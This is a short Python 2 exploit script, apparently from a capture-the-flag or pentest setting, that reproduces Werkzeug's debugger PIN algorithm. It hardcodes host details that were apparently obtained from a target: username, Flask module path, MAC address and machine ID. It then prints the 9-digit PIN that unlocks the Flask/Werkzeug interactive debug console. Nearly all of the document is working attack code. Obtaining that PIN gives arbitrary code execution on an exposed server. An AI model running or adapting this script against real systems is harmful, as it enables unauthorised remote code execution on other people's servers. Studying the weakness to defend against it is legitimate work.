#!/usr/bin/env python
# -*- coding:utf-8 -*-
import hashlib

def get_pin_and_cookie_name():

    rv = None
    num = None
    probably_public_bits = [
        "root"       #username,
       "flask.app"#modname,
       "Flask"#getattr(app, '__name__', getattr(app.__class__, '__name__')),
       "/usr/local/lib/python2.7/dist-packages/flask/app.pyc"#getattr(mod, '__file__', None),
       "52230783609"#str(uuid.getnode()),网卡信息转10进制
       "340ae5fcfaaa41f69f10045a4417e24d"#get_machine_id(),注册表信息
    ]

    # This information is here to make it harder for an attacker to
    # guess the cookie name.  They are unlikely to be contained anywhere
    # within the unauthenticated debug page.


    h = hashlib.md5()
    for bit in probably_public_bits:
        if not bit:
            continue
        if isinstance(bit,str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    # If we need to generate a pin we salt it a bit more so that we don't
    # end up with the same value and generate out 9 digits
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    # Format the pincode in groups of digits for easier remembering if
    # we don't have a result yet.
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                              for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    return rv



print get_pin_and_cookie_name()